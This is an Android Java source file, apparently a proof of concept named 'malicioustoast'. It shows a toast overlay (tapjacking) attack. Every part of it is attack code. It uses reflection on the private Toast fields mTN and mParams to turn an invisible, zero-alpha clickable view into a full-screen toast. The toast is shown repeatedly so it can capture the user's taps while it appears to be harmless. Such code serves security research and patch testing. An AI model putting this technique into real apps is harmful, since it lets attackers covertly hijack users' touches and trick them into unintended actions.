package dev.virtualpatch.malicioustoast;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.os.Bundle;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.Toast;

import java.lang.reflect.Field;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toast.makeText(this, "I'm a legit toast", Toast.LENGTH_SHORT).show();
        findViewById(R.id.startBtn).setOnClickListener((view) -> {
            try {
                start();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });

    }


    private void start() throws InterruptedException {
        Thread.sleep(1000);
        (new Thread(() -> {
            try {
                toastLoop();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        })).start();
    }

    private void toastLoop() throws InterruptedException {
        for(int i = 0; i< 10; i++) {
            runOnUiThread(() -> {
                try {
                    showMaliciousToast();
                } catch (NoSuchFieldException | IllegalAccessException e) {
                    e.printStackTrace();
                }
            });
            Thread.sleep(4000);
        }

    }

    private void showMaliciousToast() throws NoSuchFieldException, IllegalAccessException {
        Toast toast = null;
        ClickableTextView view = new ClickableTextView(this);
        view.setText("");
        view.setAlpha(0);
        toast = Toast.makeText(getApplicationContext(), "", Toast.LENGTH_LONG);
        toast.setGravity(Gravity.TOP, 0, 0);
        toast.setView(view);





        @SuppressLint("SoonBlockedPrivateApi")
        Field field = toast.getClass().getDeclaredField("mTN");

        field.setAccessible(true);
        Object mTN = field.get(toast);

        Field field1 = mTN.getClass().getDeclaredField("mParams");
        field1.setAccessible(true);
        Object mParams = field1.get(mTN);

        WindowManager.LayoutParams params = (WindowManager.LayoutParams) mParams;
        params.flags = WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE ;
        params.width = WindowManager.LayoutParams.MATCH_PARENT;
        params.height = WindowManager.LayoutParams.MATCH_PARENT;

        toast.show();
    }
}